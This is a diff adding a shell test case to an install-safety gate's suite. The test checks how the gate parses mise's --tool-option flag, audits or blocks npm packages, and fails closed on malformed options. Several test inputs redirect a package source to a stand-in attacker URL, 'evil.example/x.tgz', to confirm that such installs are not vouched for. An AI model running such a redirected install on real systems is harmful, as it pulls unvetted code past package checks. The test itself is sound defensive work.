@@ -5518,6 +5518,72 @@ case_mise_tool_options_are_not_discarded() {
   pass "$FUNCNAME"
 }
 
+case_mise_use_tool_option_modeled() {
+  prepare_case "mise-use-tool-option"
+  # `mise use --tool-option` is how mise itself prescribes approving a
+  # package past its installer's own checks (allow_low_downloads past
+  # aube's reputation threshold): the gate must parse it, not refuse it as
+  # an unrecognized flag. The option changes no source, so the audit runs.
+  SAFE_INSTALL_TEST_SCRIPT='mise use --tool-option allow_low_downloads=true npm:okpkg@1.2.3' run_zsh
+  assert_status 0 "$FUNCNAME" || return
+  assert_log_contains $'AUDIT\tpackage-audit\tokpkg@1.2.3\t--ecosystem\tnpm\t--gate\tinstall\t--op\tinstall' "$FUNCNAME" || return
+  assert_log_contains $'REAL\tmise\tuse\t--tool-option\tallow_low_downloads=true\tnpm:okpkg@1.2.3' "$FUNCNAME" || return
+
+  # The equals form reaches the same audit; a blocked package still blocks.
+  : > "${LOG_FILE}"
+  SAFE_INSTALL_TEST_SCRIPT='mise use --tool-option=allow_low_downloads=true npm:blockme@1.0.0' run_zsh
+  assert_status 104 "$FUNCNAME" || return
+  assert_log_not_contains_fragment $'REAL\tmise' "$FUNCNAME" || return
+
+  # The bracket form of the same key keeps the audit too.
+  : > "${LOG_FILE}"
+  SAFE_INSTALL_TEST_SCRIPT='mise use "npm:blockme[allow_low_downloads=true]@1.0.0"' run_zsh
+  assert_status 104 "$FUNCNAME" || return
+
+  # A source-changing CLI option takes the same notice path as its bracket
+  # and configured forms: no verdict vouches for the redirected install.
+  : > "${LOG_FILE}"
+  SAFE_INSTALL_TEST_SCRIPT='mise use --tool-option url=https://evil.example/x.tgz npm:okpkg@1.2.3' run_zsh
+  assert_status 0 "$FUNCNAME" || return
+  assert_log_not_contains_fragment 'AUDIT' "$FUNCNAME" || return
+  assert_err_contains_fragment 'not audit-gated' "$FUNCNAME" || return
+  assert_log_contains $'REAL\tmise\tuse\t--tool-option\turl=https://evil.example/x.tgz\tnpm:okpkg@1.2.3' "$FUNCNAME" || return
+
+  # --postinstall runs a command safe cannot model: same notice path.
+  : > "${LOG_FILE}"
+  SAFE_INSTALL_TEST_SCRIPT='mise use --postinstall "echo hi" npm:okpkg@1.2.3' run_zsh
+  assert_status 0 "$FUNCNAME" || return
+  assert_log_not_contains_fragment 'AUDIT' "$FUNCNAME" || return
+  assert_err_contains_fragment 'not audit-gated' "$FUNCNAME" || return
+
+  # Options bind to the tool that follows them: the second target is still
+  # audited even though the first took the notice path.
+  : > "${LOG_FILE}"
+  SAFE_INSTALL_TEST_SCRIPT='mise use --tool-option url=https://evil.example/x.tgz npm:okpkg@1.2.3 npm:blockme@1.0.0' run_zsh
+  assert_status 104 "$FUNCNAME" || return
+  assert_log_contains $'AUDIT\tpackage-audit\tblockme@1.0.0\t--ecosystem\tnpm\t--gate\tinstall\t--op\tinstall' "$FUNCNAME" || return
+  assert_log_not_contains_fragment $'REAL\tmise' "$FUNCNAME" || return
+
+  # A trailing option attributes to no tool: fail closed.
+  : > "${LOG_FILE}"
+  SAFE_INSTALL_TEST_SCRIPT='mise use npm:okpkg@1.2.3 --tool-option allow_low_downloads=true' run_zsh
+  assert_status 100 "$FUNCNAME" || return
+  assert_log_not_contains_fragment 'REAL' "$FUNCNAME" || return
+
+  # A malformed option (no key=value) fails closed.
+  : > "${LOG_FILE}"
+  SAFE_INSTALL_TEST_SCRIPT='mise use --tool-option justakey npm:okpkg@1.2.3' run_zsh
+  assert_status 100 "$FUNCNAME" || return
+  assert_log_not_contains_fragment 'REAL' "$FUNCNAME" || return
+
+  # install has no --tool-option in mise: still refused as unrecognized.
+  : > "${LOG_FILE}"
+  SAFE_INSTALL_TEST_SCRIPT='mise install --tool-option allow_low_downloads=true npm:okpkg@1.2.3' run_zsh
+  assert_status 100 "$FUNCNAME" || return
+  assert_log_not_contains_fragment 'REAL' "$FUNCNAME" || return
+  pass "$FUNCNAME"
+}
+
 case_mise_unmodeled_sources_are_not_vouched() {
   prepare_case "mise-unmodeled-sources"
   # The derivation models cargo/composer/bun sources now (PR6): mise-only
@@ -6844,6 +6910,7 @@ main() {
     case_mise_helper_queries_use_delegate_context \
     case_mise_env_transport_is_lossless \
     case_mise_tool_options_are_not_discarded \
+    case_mise_use_tool_option_modeled \
     case_mise_entry_schema_is_strict \
     case_mise_unmodeled_sources_are_not_vouched \
     case_mise_scoped_exclusion_and_interactive \
